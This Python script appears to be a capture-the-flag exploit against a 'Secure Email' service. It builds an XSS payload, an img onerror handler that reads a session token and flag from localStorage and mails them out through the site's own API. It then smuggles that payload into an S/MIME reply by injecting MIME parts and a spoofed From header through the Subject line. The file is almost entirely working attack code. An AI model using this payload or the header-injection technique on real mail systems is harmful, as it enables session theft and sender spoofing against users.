import base64

PWN = ("<img src=x onerror=\"fetch('/api/send',{method:'POST',"
       "headers:{'Content-Type':'application/json','token':localStorage.getItem('token')},"
       "body:JSON.stringify({to:'user@ses',subject:'pwned',body:String(localStorage.getItem('flag'))})})\">")

BODY = "\n\n".join([
    "We've gotten your message and will respond soon.",
    "Thank you for choosing SES!",
    "Best regards,",
    "The Secure Email Team",
])


def make_D(b1, b2):
    """Payload smuggled through the reply's Subject.

    b1 = predicted boundary of the signed content's multipart/mixed (1st MT call)
    b2 = predicted boundary of the outer multipart/signed           (2nd MT call)

    Two contexts, one string:
      * inside the signed content (body) it terminates the text/plain part early and
        injects a text/html part decoded from base64 -> our <img onerror> payload;
      * in the reply's outer header block (the generator folds the Subject and drops
        blank lines, so the whole text stays in the headers) every line of our part is
        prefixed with a space so OpenSSL treats it as a folded continuation and never
        sees a stray Content-Type, while the final line re-states the real
        multipart/signed (same boundary) so that *both* mail-parser and OpenSSL resolve
        the top level to the genuine S/MIME wrapper.
    """
    b64 = base64.b64encode(PWN.encode()).decode()
    return ("\n\n"
            "\n--" + b1 + " \n Content-Type : text/html\nContent-Transfer-Encoding : base64\n\n"
            + b64 + "\n--" + b1 + "-- "
            + "\nContent-Type : multipart/signed; protocol=\"application/pkcs7-signature\"; "
              "micalg=\"sha-256\"; boundary=\"" + b2 + "\"")


def ews(text, chunk=30):
    b = text.encode('utf-8')
    parts = [b[i:i + chunk] for i in range(0, len(b), chunk)]
    return " ".join("=?utf-8?B?" + base64.b64encode(p).decode() + "?=" for p in parts)


def make_subj(b1, b2, target='admin@ses'):
    return ews(make_D(b1, b2)) + "\nFrom :" + target
